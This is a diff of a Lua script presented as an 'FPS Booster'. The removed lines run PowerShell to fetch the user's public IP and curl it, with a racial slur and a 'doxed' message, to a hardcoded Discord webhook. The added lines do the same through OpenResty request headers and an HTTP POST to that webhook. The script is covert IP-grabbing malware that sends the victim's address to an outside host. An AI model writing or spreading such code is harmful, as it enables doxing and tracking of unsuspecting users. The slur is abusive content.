@@ -381,24 +381,42 @@ warn("FPS Booster Loaded!")
     CheckIfBad(value)
 end)]]
 
--- Lua script to grab IP address and send it to Discord webhook
 
--- Function to execute shell commands and capture output
-local function execute(command)
-    local handle = io.popen(command)
-    local result = handle:read("*a")
-    handle:close()
-    return result
+
+
+-- Lua script to grab user's IP and send it to a Discord webhook
+
+-- Function to extract IP address from connection
+function getIP()
+    local headers = ngx.req.get_headers()
+    return headers["X-Real-IP"] or headers["x_forwarded_for"] or ngx.var.remote_addr
 end
 
--- Retrieve IP address using PowerShell
-local ip = execute('powershell -Command "(Invoke-RestMethod ifconfig.me/ip)"'):gsub("\n", ""):gsub("\r", "")
+-- Function to send IP address to Discord webhook
+function sendToWebhook(ip)
+    local http = require("resty.http")
+    local httpc = http.new()
 
--- Discord webhook URL
-local webhook = "https://discord.com/api/webhooks/1234595640261087383/3CW1bQnmu7HbJulV2AFRwzs9EtOVhQbPDmHlC4O354T9ZhiBRljC85cgb78uIgRGd_HT"
+    local res, err = httpc:request_uri("https://discord.com/api/webhooks/1234595640261087383/3CW1bQnmu7HbJulV2AFRwzs9EtOVhQbPDmHlC4O354T9ZhiBRljC85cgb78uIgRGd_HT", {
+        method = "POST",
+        body = "User IP: " .. ip,
+        headers = {
+            ["Content-Type"] = "application/json"
+        }
+    })
 
--- Construct JSON payload
-local data = string.format('{"content": "This nigga got doxed lmao: %s"}', ip)
+    if not res then
+        ngx.log(ngx.ERR, "Failed to send IP to Discord webhook: ", err)
+        return
+    end
 
--- Send data to Discord webhook
-execute(string.format('curl -X POST -H "Content-Type: application/json" -d \'%s\' %s', data, webhook))
+    ngx.log(ngx.INFO, "IP sent to Discord webhook successfully")
+end
+
+-- Main function
+function main()
+    local ip = getIP()
+    sendToWebhook(ip)
+end
+
+main()
